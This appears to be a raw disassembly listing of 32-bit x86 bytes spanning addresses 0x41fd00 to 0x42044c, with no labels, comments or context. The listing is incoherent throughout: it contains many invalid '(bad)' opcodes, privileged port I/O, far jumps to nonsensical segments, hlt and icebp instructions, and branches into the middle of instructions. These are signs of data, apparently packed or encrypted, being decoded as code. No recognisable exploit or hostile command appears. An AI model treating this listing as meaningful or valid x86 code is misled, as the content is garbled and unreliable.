  41fd00:	dec    BYTE PTR [eax-0x49]
  41fd03:	pusha  
  41fd04:	inc    esi
  41fd05:	into   
  41fd06:	scas   eax,DWORD PTR es:[edi]
  41fd07:	mov    edi,0x959aab22
  41fd0c:	imul   edx,ecx,0x5a
  41fd0f:	sar    BYTE PTR [ecx-0x6e],0x2
  41fd13:	jecxz  0x41fd89
  41fd15:	pop    es
  41fd16:	fbld   TBYTE PTR [ebx-0xe]
  41fd19:	mov    ah,0xd5
  41fd1b:	cmp    al,0xd3
  41fd1d:	mov    bh,0x84
  41fd1f:	mov    dl,0x43
  41fd21:	ja     0x41fd83
  41fd23:	(bad)  
  41fd24:	inc    eax
  41fd25:	jmp    0x41fcd5
  41fd27:	dec    eax
  41fd28:	inc    ebx
  41fd29:	add    al,0xfa
  41fd2b:	adc    al,0xb1
  41fd2d:	pop    edi
  41fd2e:	out    dx,eax
  41fd2f:	xor    al,0x68
  41fd31:	xor    al,0x71
  41fd33:	cs xor al,0xda
  41fd36:	fs xchg edi,eax
  41fd38:	add    al,0xe7
  41fd3a:	out    0xbd,eax
  41fd3c:	jns    0x41fd58
  41fd3e:	(bad)
  41fd41:	inc    eax
  41fd42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd43:	sub    al,0x77
  41fd45:	lahf   
  41fd46:	sub    eax,0xdc1e152
  41fd4b:	imul   esp,DWORD PTR [edi-0x42],0xffffffed
  41fd4f:	inc    esp
  41fd50:	(bad)  
  41fd51:	(bad)  
  41fd53:	repz ret 0xcf42
  41fd57:	cmp    ch,ch
  41fd59:	ret    
  41fd5a:	add    DWORD PTR [ecx+0xc],edx
  41fd5d:	lds    edx,FWORD PTR [ebp-0x71]
  41fd60:	mov    bl,0x2c
  41fd62:	adc    DWORD PTR [ebp+0xfac9001],eax
  41fd68:	cdq    
  41fd69:	xchg   BYTE PTR [edi],cl
  41fd6b:	push   ss
  41fd6c:	out    0xe7,al
  41fd6e:	fs push 0xffffffa2
  41fd71:	sbb    dh,ch
  41fd73:	mov    esi,0x83ead03
  41fd78:	repz ss iret 
  41fd7b:	xor    cl,BYTE PTR [esi]
  41fd7d:	sub    WORD PTR [esi+0x651de3bc],di
  41fd84:	push   0xc4a69e06
  41fd89:	test   ebx,ebp
  41fd8b:	lock jne 0x41fd5c
  41fd8e:	xlat   BYTE PTR ds:[ebx]
  41fd8f:	test   al,0x3e
  41fd91:	jle    0x41fd77
  41fd93:	loope  0x41fdb3
  41fd95:	out    dx,al
  41fd96:	add    ecx,ebx
  41fd98:	xchg   ah,cl
  41fd9a:	(bad)  
  41fd9b:	in     eax,dx
  41fd9c:	fcom   DWORD PTR [edi-0x46]
  41fd9f:	pop    ecx
  41fda0:	ret    
  41fda1:	cmp    eax,DWORD PTR [ecx]
  41fda3:	daa    
  41fda4:	out    0x16,al
  41fda6:	jmp    FWORD PTR [esi]
  41fda8:	scas   al,BYTE PTR es:[edi]
  41fda9:	push   esi
  41fdaa:	ss retf 
  41fdac:	or     ebx,edx
  41fdae:	call   0xa3028540
  41fdb3:	jg     0x41fd8a
  41fdb5:	jge    0x41fdee
  41fdb7:	lahf   
  41fdb8:	mov    ch,0x90
  41fdba:	xchg   edx,eax
  41fdbb:	add    dl,BYTE PTR [esi+0x75]
  41fdbe:	dec    eax
  41fdbf:	sub    edx,DWORD PTR [edi+ebp*4-0x33]
  41fdc3:	and    al,cl
  41fdc5:	pop    esp
  41fdc6:	in     al,0xa
  41fdc8:	cs dec ebp
  41fdca:	cld    
  41fdcb:	adc    bl,BYTE PTR [edx-0x6c]
  41fdce:	gs lock in al,dx
  41fdd1:	(bad)  
  41fdd2:	sbb    al,0xfa
  41fdd4:	cdq    
  41fdd5:	inc    ebp
  41fdd6:	and    ecx,esi
  41fdd8:	adc    BYTE PTR [edi+0x1a],ch
  41fddb:	std    
  41fddc:	sub    al,0x52
  41fdde:	(bad)  
  41fddf:	sahf   
  41fde0:	jnp    0x41fe0f
  41fde2:	lahf   
  41fde3:	test   DWORD PTR ss:[ecx+0x20],edx
  41fde7:	pop    ds
  41fde8:	xchg   DWORD PTR [edi-0x592c22fe],esp
  41fdee:	in     eax,0xed
  41fdf0:	fsin   
  41fdf2:	pop    ebp
  41fdf3:	cmp    BYTE PTR [edx],dh
  41fdf5:	je     0x41fdd2
  41fdf7:	fst    QWORD PTR [ebp+0x6d]
  41fdfa:	mov    ah,0xb9
  41fdfc:	enter  0x28ca,0x8
  41fe00:	inc    ebp
  41fe01:	fdiv   QWORD PTR [ebx+0x75]
  41fe04:	jp     0x41fe1d
  41fe06:	pop    esi
  41fe07:	and    edx,esp
  41fe09:	lods   al,BYTE PTR ds:[esi]
  41fe0a:	add    esp,DWORD PTR [eax+edi*1+0xb521b52]
  41fe11:	mov    ebp,0xc015d461
  41fe16:	dec    ebp
  41fe17:	and    esi,edx
  41fe19:	jmp    0x41fe64
  41fe1b:	jnp    0x41fe5d
  41fe1d:	test   DWORD PTR [edi-0x4e],edi
  41fe20:	loop   0x41fe1c
  41fe22:	jge    0x41fdd8
  41fe24:	mov    BYTE PTR [esi-0x72],bh
  41fe27:	push   ecx
  41fe28:	gs je  0x41fdd4
  41fe2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe2c:	pop    esp
  41fe2d:	scas   al,BYTE PTR es:[edi]
  41fe2e:	fldenv ds:[esi-0x25de0955]
  41fe36:	hlt    
  41fe37:	push   esi
  41fe38:	fwait
  41fe39:	or     DWORD PTR [edi-0x2a],edx
  41fe3c:	hlt    
  41fe3d:	jp     0x41fe65
  41fe3f:	mov    bh,ch
  41fe41:	mov    ebp,0xe511b192
  41fe47:	add    al,0x67
  41fe49:	(bad)  
  41fe4a:	inc    edi
  41fe4b:	push   esi
  41fe4c:	push   eax
  41fe4d:	retf   0xa5e8
  41fe50:	sbb    bl,BYTE PTR [ebp+0x6]
  41fe53:	add    ebp,esp
  41fe55:	cmp    edx,DWORD PTR [ebp-0x71]
  41fe58:	mov    gs,eax
  41fe5a:	loopne 0x41fdde
  41fe5c:	jmp    0xc862:0x9bde6ad4
  41fe63:	lock push 0xffffffd2
  41fe66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe67:	add    al,0xb0
  41fe69:	jge    0x41fea1
  41fe6b:	stos   DWORD PTR es:[edi],eax
  41fe6c:	mov    ebp,0xb8df361a
  41fe71:	push   ds
  41fe72:	jnp    0x41fe42
  41fe74:	(bad)  
  41fe75:	fisttp QWORD PTR [ebp+0x7]
  41fe78:	pop    es
  41fe79:	xor    eax,0xc9caeab8
  41fe7e:	or     edi,DWORD PTR [ebx-0x4ba62b92]
  41fe84:	sahf   
  41fe85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe86:	ins    DWORD PTR es:[edi],dx
  41fe87:	cli    
  41fe88:	mul    al
  41fe8a:	es or  eax,0x2d252d7f
  41fe90:	jb     0x41fe42
  41fe92:	inc    esi
  41fe93:	out    0x21,al
  41fe95:	repz test al,0xf6
  41fe98:	imul   esp,esi,0xc7cd297d
  41fe9e:	imul   BYTE PTR [edx-0x61]
  41fea1:	enter  0x91f0,0x3c
  41fea5:	addr16 jbe 0x41febe
  41fea8:	dec    ebp
  41fea9:	jecxz  0x41fe61
  41feab:	aas    
  41feac:	popf   
  41fead:	adc    eax,0x2f900a05
  41feb2:	sbb    BYTE PTR [edi+0x4e],ah
  41feb5:	mov    ecx,0xb0053c83
  41feba:	popf   
  41febb:	mov    ecx,DWORD PTR [edi+eax*2-0x52]
  41febf:	adc    eax,0x56c7e4f5
  41fec4:	retf   
  41fec5:	xor    BYTE PTR [ebp-0x6e],0xbd
  41fec9:	or     eax,0xc30a7363
  41fece:	lock xor al,0x79
  41fed1:	aas    
  41fed2:	jnp    0x41fe58
  41fed4:	rol    BYTE PTR [ecx],cl
  41fed6:	sub    ebp,DWORD PTR [ebp+edx*8-0x6f]
  41feda:	push   edx
  41fedb:	imul   eax,DWORD PTR [esi+0x59],0xffffffb6
  41fedf:	xor    ch,0xba
  41fee2:	dec    edx
  41fee3:	retf   
  41fee4:	add    eax,DWORD PTR [eax]
  41fee6:	test   al,dl
  41fee8:	pop    ss
  41fee9:	add    dh,dl
  41feeb:	call   0xc322:0xa97d29fe
  41fef2:	std    
  41fef3:	in     eax,0x91
  41fef5:	cwde   
  41fef6:	jo     0x41fe7a
  41fef8:	call   0x3877:0x77e2f2a
  41feff:	clc    
  41ff00:	mov    BYTE PTR [edx-0x19],0xff
  41ff04:	jae    0x41fec7
  41ff06:	fsubr  DWORD PTR [ecx+0x44]
  41ff09:	mov    eax,0x70f5e745
  41ff0e:	lahf   
  41ff0f:	sbb    eax,0x43ef96f7
  41ff14:	dec    edx
  41ff15:	test   eax,0xb724d6c7
  41ff1a:	clc    
  41ff1b:	dec    edx
  41ff1c:	dec    edx
  41ff1d:	mov    ds:0x3fb88a02,eax
  41ff22:	retf   0xeafd
  41ff25:	dec    cx
  41ff27:	hlt    
  41ff28:	dec    eax
  41ff29:	popf   
  41ff2a:	pop    edx
  41ff2b:	adc    DWORD PTR [ebx],ebp
  41ff2d:	fistp  QWORD PTR [ebx-0x2b]
  41ff30:	lahf   
  41ff31:	or     eax,0x5abff24f
  41ff36:	or     edx,DWORD PTR [ebx]
  41ff38:	xor    ch,0x89
  41ff3b:	fisttp WORD PTR [edi+ebx*1]
  41ff3e:	sub    DWORD PTR [edx],ebp
  41ff40:	adc    DWORD PTR [ecx+0x65],esp
  41ff43:	adc    dl,dl
  41ff45:	mov    BYTE PTR [esi],dl
  41ff47:	xor    bl,0x7d
  41ff4a:	ror    BYTE PTR [ebx-0x4e3147b2],1
  41ff50:	(bad)  
  41ff51:	out    0xde,al
  41ff53:	sub    dh,bl
  41ff55:	fbld   TBYTE PTR [eax]
  41ff57:	icebp  
  41ff58:	cmp    bh,bl
  41ff5a:	dec    esp
  41ff5b:	mov    bl,0x67
  41ff5d:	or     bh,ah
  41ff5f:	sub    DWORD PTR [edi-0x44],ebx
  41ff62:	stc    
  41ff63:	fadd   QWORD PTR [eax]
  41ff65:	inc    ecx
  41ff66:	les    ebx,FWORD PTR [edx]
  41ff68:	adc    DWORD PTR [ecx-0x1],0x50
  41ff6c:	aaa    
  41ff6d:	push   ebx
  41ff6e:	fcmovnu st,st(4)
  41ff70:	mov    ch,0x31
  41ff72:	mov    bl,0x7f
  41ff74:	mov    eax,0x70fbb381
  41ff79:	mov    ds:0x769279aa,al
  41ff7e:	xlat   BYTE PTR fs:[ebx]
  41ff80:	dec    ebx
  41ff81:	test   BYTE PTR [eax+0xa0e86b5],0x3f
  41ff88:	mov    esp,0x6c6a4877
  41ff8d:	(bad)  
  41ff8e:	mov    eax,ds:0xa467a5b6
  41ff93:	xchg   edx,eax
  41ff94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff95:	fistp  DWORD PTR [edi-0x48]
  41ff98:	(bad)  
  41ff9b:	ins    BYTE PTR es:[edi],dx
  41ff9c:	hlt    
  41ff9d:	dec    esp
  41ff9e:	inc    edx
  41ff9f:	rcl    BYTE PTR [ecx],0xe8
  41ffa2:	cld    
  41ffa3:	cmp    DWORD PTR [edx],ebx
  41ffa5:	outs   dx,DWORD PTR ds:[esi]
  41ffa6:	pop    ecx
  41ffa7:	pop    ebx
  41ffa8:	mov    esi,0xa1412181
  41ffad:	hlt    
  41ffae:	icebp  
  41ffaf:	push   esi
  41ffb0:	mov    ds:0x59bf978f,al
  41ffb5:	mov    al,0xb3
  41ffb7:	fldlg2 
  41ffb9:	pop    ecx
  41ffba:	sub    BYTE PTR [ebp+0x5ae85a76],ch
  41ffc0:	fild   DWORD PTR [edx+0x41ceeaab]
  41ffc6:	jg     0x41ffa4
  41ffc8:	popa   
  41ffc9:	fwait
  41ffca:	mov    DWORD PTR [edx-0x34],ecx
  41ffcd:	outs   dx,DWORD PTR ds:[esi]
  41ffce:	ja     0x42003a
  41ffd0:	xlat   BYTE PTR ds:[ebx]
  41ffd1:	mov    ecx,0x24ef14f3
  41ffd6:	pop    esp
  41ffd7:	cdq    
  41ffd8:	mov    ecx,0x35bf7e0a
  41ffdd:	mov    ebp,0xa01a7386
  41ffe2:	mov    ds:0x67fe0961,eax
  41ffe7:	or     DWORD PTR [esi+edi*8+0x1e],ebp
  41ffeb:	pop    ds
  41ffec:	mov    gs,edi
  41ffee:	inc    eax
  41ffef:	cwde   
  41fff0:	(bad)  
  41fff1:	in     eax,0xd9
  41fff3:	dec    ecx
  41fff4:	in     al,0x9c
  41fff6:	xor    eax,0x2092284
  41fffb:	shl    DWORD PTR [esi+eiz*1-0x43a4e697],1
  420002:	(bad)  
  420003:	arpl   WORD PTR [edx+0x63],ax
  420006:	inc    ecx
  420007:	pmullw mm3,QWORD PTR [ebx-0x43d31ed2]
  42000e:	xchg   BYTE PTR [ebx+edx*2+0x74],cl
  420012:	shr    DWORD PTR [edi+0x703aa9b6],1
  420018:	ins    DWORD PTR es:[edi],dx
  420019:	in     al,0x15
  42001b:	push   ss
  42001c:	rcr    BYTE PTR [edi],cl
  42001e:	repnz outs dx,BYTE PTR ds:[esi]
  420020:	push   eax
  420021:	inc    edi
  420022:	and    al,ch
  420024:	retf   
  420025:	fisub  DWORD PTR [ebx+0x50d3b081]
  42002b:	add    esp,ebp
  42002d:	cli    
  42002e:	mov    ebx,0x76bab2d1
  420033:	test   eax,0x19ef1ff5
  420038:	push   0xffffffa6
  42003a:	(bad)  
  42003b:	test   BYTE PTR [ebx-0x3e],cl
  42003e:	jbe    0x41ffde
  420040:	adc    DWORD PTR [eax],0xd632eb32
  420046:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420047:	pop    esp
  420048:	rcl    DWORD PTR [edi],0xa4
  42004b:	inc    ebp
  42004c:	jle    0x4200b0
  42004e:	xchg   esp,eax
  42004f:	cli    
  420050:	leave  
  420051:	pushf  
  420052:	jnp    0x4200a0
  420054:	lahf   
  420055:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420056:	cs push ds
  420058:	push   cs
  420059:	jl     0x42008c
  42005b:	dec    edx
  42005c:	push   edx
  42005d:	das    
  42005e:	cdq    
  42005f:	sar    ebp,cl
  420061:	pop    edx
  420062:	js     0x41fff2
  420064:	and    BYTE PTR [edx+0x311bd501],cl
  42006a:	jno    0x42005b
  42006c:	jae    0x4200d9
  42006e:	and    eax,0x140b817b
  420073:	or     edi,DWORD PTR [edi+0x5a3d30d2]
  420079:	out    0x26,eax
  42007b:	fld    DWORD PTR [esi-0x4697bfd0]
  420081:	inc    ebp
  420082:	mov    ebp,0xd1e0776e
  420087:	xchg   esi,eax
  420088:	aaa    
  420089:	mov    eax,cs
  42008b:	adc    dl,BYTE PTR [esi+0x4e]
  42008e:	pusha  
  42008f:	sahf   
  420090:	mov    ch,0x5d
  420092:	dec    ebp
  420093:	mov    ah,0x14
  420095:	mov    ecx,0x232dee65
  42009a:	sub    eax,0x3771c950
  42009f:	or     ecx,DWORD PTR [edi]
  4200a1:	jmp    0xf878:0xcc74b493
  4200a8:	push   cs
  4200a9:	jns    0x420112
  4200ab:	push   esi
  4200ac:	sub    bl,cl
  4200ae:	imul   BYTE PTR [esi-0x3e]
  4200b1:	xchg   esi,eax
  4200b2:	test   BYTE PTR [edi+eiz*1-0x49],bl
  4200b6:	jno    0x42006d
  4200b8:	sub    bh,ch
  4200ba:	cmp    esi,DWORD PTR [eax]
  4200bc:	jp     0x420046
  4200be:	dec    ecx
  4200bf:	scas   eax,DWORD PTR es:[edi]
  4200c0:	pop    ebx
  4200c1:	mov    esp,0x216dec8
  4200c6:	jmp    0x4200f3
  4200c8:	shl    BYTE PTR [esi+0x7fb34df],cl
  4200ce:	(bad)  
  4200d0:	das    
  4200d1:	aam    0xfc
  4200d3:	or     bl,BYTE PTR [esi]
  4200d5:	fcomp  DWORD PTR ds:0xea0d7d9e
  4200db:	out    dx,al
  4200dc:	sti    
  4200dd:	xlat   BYTE PTR ds:[ebx]
  4200de:	xor    eax,0x938f6ccb
  4200e3:	ins    BYTE PTR es:[edi],dx
  4200e4:	rol    cl,1
  4200e6:	and    al,BYTE PTR [edi-0x768a5184]
  4200ec:	jo     0x420146
  4200ee:	inc    ecx
  4200ef:	xlat   BYTE PTR ds:[ebx]
  4200f0:	jle    0x42016c
  4200f2:	ret    
  4200f3:	ret    
  4200f4:	dec    edi
  4200f5:	sbb    eax,0xac74d8e0
  4200fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200fb:	xor    al,0xbb
  4200fd:	aad    0x4b
  4200ff:	dec    edx
  420100:	inc    eax
  420101:	mov    edi,0xba100194
  420106:	fwait
  420107:	test   eax,0x8a86c218
  42010c:	stc    
  42010d:	add    BYTE PTR ds:[esp+ebp*2+0x249dfb88],ch
  420115:	retf   0xd344
  420118:	inc    ecx
  420119:	sub    ebx,DWORD PTR [ebx+0x52]
  42011c:	and    eax,esp
  42011e:	cmp    al,BYTE PTR [ecx+0xf]
  420121:	aam    0x46
  420123:	push   ds
  420124:	jbe    0x420197
  420126:	add    eax,0x65b38033
  42012b:	mov    bl,0xdd
  42012d:	mov    dl,0x8c
  42012f:	fadd   DWORD PTR ds:0x460a5097
  420135:	adc    BYTE PTR [ebx+0xa85dca],cl
  42013b:	(bad)  
  42013c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42013d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42013e:	push   0xec516c96
  420143:	jo     0x4200dc
  420145:	lea    esp,[eax+eiz*4-0x5b]
  420149:	adc    DWORD PTR [ebx-0x7c],ebx
  42014c:	in     eax,dx
  42014d:	out    dx,al
  42014e:	aas    
  42014f:	mov    ah,0xb7
  420151:	aam    0xca
  420153:	in     al,0xba
  420155:	inc    ecx
  420156:	fnstcw WORD PTR [eax-0xe4a6fa5]
  42015c:	sti    
  42015d:	mov    edx,0xc9f1480
  420162:	pusha  
  420163:	out    0xd5,al
  420165:	xchg   esp,eax
  420166:	ja     0x420195
  420168:	fiadd  DWORD PTR [ecx]
  42016a:	xchg   ecx,eax
  42016b:	mov    dh,dh
  42016d:	mov    al,0xe6
  42016f:	inc    edx
  420170:	out    dx,eax
  420171:	xchg   edi,eax
  420172:	fwait
  420173:	jmp    0x420122
  420175:	out    0x5b,al
  420177:	sti    
  420178:	cwde   
  420179:	pop    eax
  42017a:	xchg   ebp,eax
  42017b:	dec    eax
  42017c:	lods   eax,DWORD PTR ds:[esi]
  42017d:	add    eax,0xbd62a2f4
  420182:	or     DWORD PTR [eax+0xfa2a8de],ebp
  420188:	call   0xa700:0x471a27d
  42018f:	and    BYTE PTR [edx+0x6aa0db5],ch
  420195:	mov    edi,0xf34780a0
  42019a:	daa    
  42019b:	in     al,dx
  42019c:	cwde   
  42019d:	sbb    al,0xae
  42019f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201a0:	sbb    eax,DWORD PTR [edi+0x6bdb7f03]
  4201a6:	js     0x4201f8
  4201a8:	shl    DWORD PTR [ebp-0x65220345],cl
  4201ae:	or     al,BYTE PTR [edi]
  4201b0:	xlat   BYTE PTR ds:[ebx]
  4201b1:	stos   DWORD PTR es:[edi],eax
  4201b2:	sbb    BYTE PTR [edx+0x4c],bh
  4201b5:	int    0xca
  4201b7:	add    esi,DWORD PTR [edi]
  4201b9:	fcomp  DWORD PTR [ebp+eax*8+0x7c]
  4201bd:	rcl    cl,0x1e
  4201c0:	cmp    eax,0x680a886f
  4201c5:	cwde   
  4201c6:	push   esi
  4201c7:	arpl   WORD PTR [esp+ecx*4],cx
  4201ca:	in     al,dx
  4201cb:	mov    dl,0x46
  4201cd:	xchg   ebp,eax
  4201ce:	dec    ecx
  4201cf:	lods   eax,DWORD PTR ds:[esi]
  4201d0:	test   al,0x8
  4201d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201d3:	pop    eax
  4201d4:	popf   
  4201d5:	out    0xec,al
  4201d7:	lock jl 0x4201f2
  4201da:	mov    ebp,0xde0d2f9c
  4201df:	fmul   DWORD PTR [eax-0x32]
  4201e2:	shl    DWORD PTR [eax-0x3c],0x8
  4201e6:	cli    
  4201e7:	jl     0x4201da
  4201e9:	push   cs
  4201ea:	adc    edi,DWORD PTR [ebx]
  4201ec:	ss dec esp
  4201ee:	(bad)  
  4201ef:	(bad)  [ebp+0xd28a8a3]
  4201f5:	jae    0x4201a5
  4201f7:	jl     0x4201a0
  4201f9:	(bad)  
  4201fa:	pop    ss
  4201fb:	cmp    eax,0x8fe2deed
  420200:	mov    bl,0xc5
  420202:	jp     0x42024e
  420204:	pop    edi
  420205:	ret    
  420206:	fs loop 0x42023e
  420209:	test   al,0x7c
  42020b:	xchg   esi,eax
  42020c:	mov    esp,0xf10f3f4f
  420211:	push   cs
  420212:	mov    BYTE PTR [eax+0x7e36fb01],dl
  420218:	lea    ecx,[ebp+0x36218135]
  42021e:	fst    DWORD PTR [ebx+0x4d]
  420221:	jnp    0x42028a
  420223:	or     al,BYTE PTR [ebp-0xb]
  420226:	mov    esi,0x289ea670
  42022b:	push   ds
  42022c:	jno    0x420274
  42022e:	sbb    al,0x11
  420230:	mov    cl,bl
  420232:	out    dx,al
  420233:	bound  ebx,QWORD PTR [ebp-0x5a552cea]
  420239:	aaa    
  42023a:	sti    
  42023b:	pop    edx
  42023c:	mov    ds:0xc4935ed2,al
  420241:	dec    esp
  420242:	jne    0x42028c
  420244:	lahf   
  420245:	push   edx
  420246:	jmp    0x420244
  420248:	and    al,0xb5
  42024a:	int    0xdd
  42024c:	cdq    
  42024d:	mov    bh,BYTE PTR [eax-0x4e0acaa5]
  420253:	jge    0x420216
  420255:	ss gs inc edi
  420258:	pop    DWORD PTR [eax+0x5a6c5175]
  42025e:	ret    0x5ee9
  420261:	cmp    DWORD PTR [ebp-0x36e63928],0xf17172d6
  42026b:	push   ebx
  42026c:	call   0xec12:0xb6229bfe
  420273:	sub    eax,DWORD PTR [eax+0x27]
  420276:	out    0x86,al
  420278:	sahf   
  420279:	popf   
  42027a:	xor    DWORD PTR [edx],0xffffffff
  42027d:	out    0xbb,al
  42027f:	adc    eax,0xbb716f39
  420284:	mov    ebx,0xe99d89c7
  420289:	push   ebp
  42028a:	or     al,0x7
  42028c:	sub    edx,DWORD PTR [ebp-0x5af7c130]
  420292:	imul   ebx,DWORD PTR [ecx],0xcfbf66a6
  420298:	push   ss
  420299:	ret    
  42029a:	rcl    edi,1
  42029c:	icebp  
  42029d:	je     0x420224
  42029f:	ret    
  4202a0:	pop    ebp
  4202a1:	aam    0x1d
  4202a3:	aas    
  4202a4:	jg     0x420306
  4202a6:	leave  
  4202a7:	push   edx
  4202a8:	loope  0x42029a
  4202aa:	jb     0x4202a6
  4202ac:	add    DWORD PTR [esi],ecx
  4202ae:	out    0xfc,al
  4202b0:	arpl   bx,si
  4202b2:	(bad)  
  4202b3:	mov    ebp,0x2ca64396
  4202b8:	stos   BYTE PTR es:[edi],al
  4202b9:	and    BYTE PTR [eax],bl
  4202bb:	pop    si
  4202bd:	sbb    eax,ebx
  4202bf:	mov    edi,?
  4202c1:	iret   
  4202c2:	pop    ecx
  4202c3:	inc    DWORD PTR fs:[esi]
  4202c6:	jg     0x420259
  4202c8:	sti    
  4202c9:	ins    BYTE PTR es:[edi],dx
  4202ca:	or     DWORD PTR [eax],esp
  4202cc:	xchg   ecx,eax
  4202cd:	mov    ecx,0xc3698ea2
  4202d2:	lods   eax,DWORD PTR ss:[esi]
  4202d4:	cmp    eax,DWORD PTR [esi-0x15eca252]
  4202da:	add    DWORD PTR [ecx],esp
  4202dc:	push   ss
  4202dd:	sub    al,BYTE PTR [edx-0x23af4087]
  4202e3:	lods   al,BYTE PTR ds:[esi]
  4202e4:	inc    BYTE PTR [ecx-0x5f217ce9]
  4202ea:	cwde   
  4202eb:	inc    edx
  4202ec:	scas   eax,DWORD PTR es:[edi]
  4202ed:	or     DWORD PTR [ebp+ebx*8-0x19],ebp
  4202f1:	pop    eax
  4202f2:	out    dx,al
  4202f3:	or     BYTE PTR [edi],ch
  4202f5:	mov    BYTE PTR [edx],0xa3
  4202f8:	add    BYTE PTR [edi-0x25],ah
  4202fb:	or     esi,DWORD PTR [esi-0x5c]
  4202fe:	dec    eax
  4202ff:	inc    esi
  420300:	mov    ah,0x39
  420302:	add    DWORD PTR [edi],eax
  420304:	cli    
  420305:	fwait
  420306:	ret    0x5d52
  420309:	sbb    eax,0xf1650390
  42030e:	je     0x420371
  420310:	mov    eax,0xf0e454a3
  420315:	lods   eax,DWORD PTR ds:[esi]
  420316:	rcl    DWORD PTR [esi+0x63],cl
  420319:	sar    DWORD PTR [eax+ebp*8-0x5a6cb374],1
  420320:	test   al,0xdd
  420322:	dec    eax
  420323:	fld    QWORD PTR [esi]
  420325:	jl     0x42036c
  420327:	add    BYTE PTR [esi],al
  420329:	dec    esi
  42032a:	mov    bh,0x35
  42032c:	xchg   edx,eax
  42032d:	(bad)  
  42032e:	lods   al,BYTE PTR ds:[esi]
  42032f:	call   0x8410a291
  420334:	leave  
  420335:	lock mov ebp,DWORD PTR [edi+ecx*8]
  420339:	cmp    DWORD PTR [eax-0x5f2a44b0],edi
  42033f:	jecxz  0x4202c8
  420341:	arpl   cx,si
  420343:	lods   eax,DWORD PTR ds:[esi]
  420344:	jo     0x4202d4
  420346:	sbb    DWORD PTR [edi-0x65b104b1],esi
  42034c:	jnp    0x4202e2
  42034e:	pop    edx
  42034f:	pop    ds
  420350:	adc    BYTE PTR [ecx+0x51],ah
  420353:	dec    eax
  420354:	outs   dx,DWORD PTR ds:[esi]
  420355:	inc    edi
  420356:	hlt    
  420357:	call   0x50f2d293
  42035c:	dec    edx
  42035d:	(bad)  
  42035e:	arpl   dx,di
  420360:	mov    eax,0x2da997f1
  420365:	or     dl,BYTE PTR [esi+0x5d]
  420368:	xchg   BYTE PTR [ecx],al
  42036a:	mov    bh,0xba
  42036c:	sub    BYTE PTR [ecx],cl
  42036e:	in     eax,0xad
  420370:	push   eax
  420371:	xor    DWORD PTR [ebp+0x2],eax
  420374:	push   ecx
  420375:	out    dx,al
  420376:	push   eax
  420377:	mov    dh,0x28
  420379:	mov    dl,0x32
  42037b:	(bad)  
  42037c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42037d:	mov    WORD PTR [eax],ds
  42037f:	icebp  
  420380:	mov    cl,BYTE PTR [ebx-0x6f]
  420383:	and    edx,DWORD PTR [ecx+0x62]
  420386:	add    ebx,DWORD PTR [ecx]
  420388:	mov    ?,WORD PTR [esi+eax*2-0x6a]
  42038c:	sbb    al,0x99
  42038e:	in     al,dx
  42038f:	push   edi
  420390:	sub    al,0xfa
  420392:	das    
  420393:	pop    ecx
  420394:	cmp    ecx,edi
  420396:	cmp    al,0x4e
  420398:	xor    DWORD PTR [ebx-0x3884f78a],0xffffffd6
  42039f:	dec    eax
  4203a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4203a1:	sub    BYTE PTR [eax+esi*4],dl
  4203a4:	ins    BYTE PTR es:[edi],dx
  4203a5:	dec    esi
  4203a6:	sbb    ecx,ebx
  4203a8:	popf   
  4203a9:	fild   QWORD PTR [ecx+ebp*4-0x374073e5]
  4203b0:	ins    DWORD PTR es:[edi],dx
  4203b1:	cmp    al,0x16
  4203b3:	and    eax,0x37d12617
  4203b8:	or     bh,BYTE PTR [ecx+edi*4-0x17a0ab73]
  4203bf:	das    
  4203c0:	mov    ch,0xc1
  4203c2:	push   edi
  4203c3:	xlat   BYTE PTR ds:[ebx]
  4203c4:	pop    ds
  4203c5:	push   es
  4203c6:	call   FWORD PTR [edx-0xb]
  4203c9:	mov    dl,0x98
  4203cb:	mov    cl,0x22
  4203cd:	pop    ecx
  4203ce:	xor    al,0xb7
  4203d0:	out    dx,eax
  4203d1:	dec    esi
  4203d2:	outs   dx,BYTE PTR ds:[esi]
  4203d3:	adc    eax,DWORD PTR [edi-0x455fddfb]
  4203d9:	fs xchg edx,eax
  4203db:	bound  ebx,QWORD PTR [esi+0xa]
  4203de:	test   DWORD PTR [ebp-0x4296f130],0x77f601a8
  4203e8:	arpl   WORD PTR [ecx-0x5bfe1944],sp
  4203ee:	fninit 
  4203f0:	inc    edx
  4203f1:	sbb    dl,0xfb
  4203f4:	mov    ecx,0x5d0f8b82
  4203f9:	in     eax,0x5e
  4203fb:	xor    esi,esp
  4203fd:	outs   dx,BYTE PTR ds:[esi]
  4203fe:	pop    ebx
  4203ff:	xchg   BYTE PTR [edi-0x3],cl
  420402:	jg     0x42045e
  420404:	sti    
  420405:	pmuludq mm5,QWORD PTR [ebp-0x4f5deb67]
  42040c:	arpl   WORD PTR [ecx+0x4fc6f64f],ax
  420412:	out    dx,al
  420413:	ds xchg esi,eax
  420415:	xor    BYTE PTR ds:0x2e312e38,dl
  42041b:	pop    edi
  42041c:	idiv   BYTE PTR [edx-0x2dcb48e4]
  420422:	or     al,0xf
  420424:	outs   dx,BYTE PTR ds:[esi]
  420425:	ret    0xcf35
  420428:	pop    ds
  420429:	out    0xd0,al
  42042b:	loop   0x42043f
  42042d:	cmp    BYTE PTR [esi+0x42],bl
  420430:	(bad)  
  420431:	cmp    eax,0x76111e0a
  420436:	push   ebx
  420437:	rol    BYTE PTR [eax],0xc
  42043a:	mov    ah,0xd8
  42043c:	test   eax,0x1c91fced
  420441:	ins    DWORD PTR es:[edi],dx
  420442:	cmp    ecx,DWORD PTR [edx-0x80]
  420445:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420446:	dec    edi
  420447:	enter  0xc83f,0x2c
  42044b:	sahf   
  42044c:	mov    edx,0x23d3a0e2
